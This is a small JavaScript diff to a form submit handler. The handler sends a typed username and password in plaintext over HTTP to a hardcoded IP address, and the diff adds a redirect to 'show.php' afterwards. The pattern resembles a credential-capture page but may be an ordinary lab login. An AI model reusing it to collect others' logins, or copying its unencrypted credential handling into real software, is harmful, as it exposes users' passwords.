@@ -11,4 +11,6 @@ document.getElementById("3").addEventListener("submit", function(e) {
 	xhr.open("POST", "http://10.1.1.2/index.php", true);
 	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 	xhr.send("username=" + uname + "&password=" + passwd);
+
+	window.location.href = "show.php";
 });
